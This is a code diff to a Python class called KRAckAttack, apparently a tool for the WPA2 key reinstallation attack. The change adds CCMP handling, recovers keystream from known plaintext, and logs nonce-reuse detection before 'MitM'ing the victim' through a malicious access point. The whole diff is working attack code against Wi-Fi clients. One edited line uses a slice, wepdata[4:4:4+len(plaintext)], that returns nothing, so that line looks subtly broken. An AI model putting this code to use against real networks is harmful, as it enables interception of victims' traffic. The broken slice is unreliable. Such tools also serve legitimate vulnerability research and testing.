@@ -320,10 +320,14 @@ class KRAckAttack():
 	def handle_from_client_pairwise(self, client, p):
 		if args.group: return
 
-		if p.haslayer(Dot11WEP):
-			# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
+		if p.haslayer(Dot11WEP) or p.haslayer(Dot11CCMP):
 			plaintext = "\xaa\xaa\x03\x00\x00\x00"
-			encrypted = p[Dot11WEP].wepdata[4:-4]
+			if p.haslayer(Dot11WEP):
+			# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes
+				encrypted = p[Dot11WEP].wepdata[4:4:4+len(plaintext)]
+			else:
+				encrypted = p[Dot11CCMP].data[:len(plaintext)]
+				
 			keystream = xorstr(plaintext, encrypted)
 
 			iv = dot11_get_iv(p)
@@ -338,7 +342,6 @@ class KRAckAttack():
 
 				# Otherwise the client likely installed a new key, i.e., probably an all-zero key
 				else:
-					# TODO: We can explicitly try to decrypt it using an all-zero key
 					log(STATUS, "SUCCESS! Nonce reuse detected (IV=%d), with usage of all-zero encryption key." % iv, color="green", showtime=False)
 					log(STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.", color="green", showtime=False)
 
@@ -352,9 +355,6 @@ class KRAckAttack():
 				client.update_state(ClientState.Failed)
 
 			client.save_iv_keystream(iv, keystream)
-
-		elif p.haslayer(Dot11CCMP):
-			print(p.show())
 
 	def handle_to_client_groupkey(self, client, p):
 		if not args.group: return False
